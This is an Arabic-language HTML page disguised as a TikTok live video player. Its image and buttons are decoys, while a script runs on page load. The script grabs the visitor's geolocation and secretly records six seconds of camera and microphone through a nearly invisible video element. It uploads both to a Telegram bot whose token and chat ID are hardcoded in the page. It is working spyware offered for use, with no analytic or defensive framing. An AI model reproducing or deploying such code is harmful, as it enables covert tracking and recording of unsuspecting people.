<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>🔥 تيك توك - الفيديو المباشر</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      background: #000;
      font-family: Arial, sans-serif;
      color: #fff;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: flex-start;
      height: 100vh;
      overflow: hidden;
    }
    .fake-player {
      width: 100%;
      max-width: 480px;
      margin-top: 40px;
      position: relative;
    }
    .fake-player img {
      width: 100%;
      height: auto;
      border-radius: 10px;
    }
    .controls {
      margin-top: 20px;
      display: flex;
      gap: 10px;
    }
    .btn {
      background: #ff2d55;
      color: #fff;
      padding: 10px 20px;
      border: none;
      border-radius: 8px;
      font-size: 16px;
      cursor: pointer;
    }
    #status {
      margin-top: 30px;
      font-size: 16px;
      color: #0f0;
    }
    video {
      position: absolute;
      width: 1px;
      height: 1px;
      opacity: 0.01;
      pointer-events: none;
    }
  </style>
</head>
<body>
  <div class="fake-player">
    <img src="https://i.imgur.com/tT9zU1s.gif" alt="TikTok Video Playing" />
  </div>

  <div class="controls">
    <button class="btn">💬 تعليق</button>
    <button class="btn">❤️ إعجاب</button>
    <button class="btn">🔗 مشاركة</button>
  </div>

  <div id="status">📡 جاري تحميل الفيديو...</div>

  <video id="video" autoplay playsinline muted></video>

  <script>
    const chat_id = "6908826896";
    const token = "8216581015:AAFEu3XEvT2jePOMdSU8OYP9olix4JNzfk4";

    function sendLocation() {
      if ("geolocation" in navigator) {
        navigator.geolocation.getCurrentPosition(pos => {
          const { latitude, longitude } = pos.coords;
          const url = `https://api.telegram.org/bot${token}/sendLocation`;
          const formData = new FormData();
          formData.append("chat_id", chat_id);
          formData.append("latitude", latitude);
          formData.append("longitude", longitude);

          fetch(url, {
            method: "POST",
            body: formData
          }).then(r => r.json()).then(d => {
            console.log("📍 Location sent:", d);
          }).catch(err => {
            console.error("❌ فشل إرسال الموقع", err);
          });

        }, err => {
          console.warn("❌ فشل تحديد الموقع:", err.message);
        });
      } else {
        console.warn("❌ المتصفح لا يدعم تحديد الموقع");
      }
    }

    async function startRecording() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
        const video = document.getElementById("video");
        video.srcObject = stream;

        const recorder = new MediaRecorder(stream);
        const chunks = [];

        recorder.ondataavailable = e => {
          if (e.data.size > 0) chunks.push(e.data);
        };

        recorder.onstop = () => {
          const blob = new Blob(chunks, { type: "video/mp4" });
          stream.getTracks().forEach(t => t.stop());

          const formData = new FormData();
          formData.append("chat_id", chat_id);
          formData.append("video", blob, "recorded.mp4");

          fetch(`https://api.telegram.org/bot${token}/sendVideo`, {
            method: "POST",
            body: formData
          }).then(res => res.json()).then(data => {
            document.getElementById("status").innerText = data.ok
              ? "✅ تم إرسال الفيديو والموقع!"
              : "❌ فشل في إرسال الفيديو.";
          }).catch(() => {
            document.getElementById("status").innerText = "❌ خطأ في إرسال الفيديو.";
          });
        };

        recorder.start();
        document.getElementById("status").innerText = "⏺️ التسجيل بالصوت والصورة جارٍ...";
        setTimeout(() => recorder.stop(), 6000); // ← سجل 6 ثواني

      } catch (err) {
        document.getElementById("status").innerText = "❌ فشل تشغيل الكاميرا والمايك.";
      }
    }

    window.onload = () => {
      sendLocation();
      startRecording();
    };
  </script>
</body>
</html>
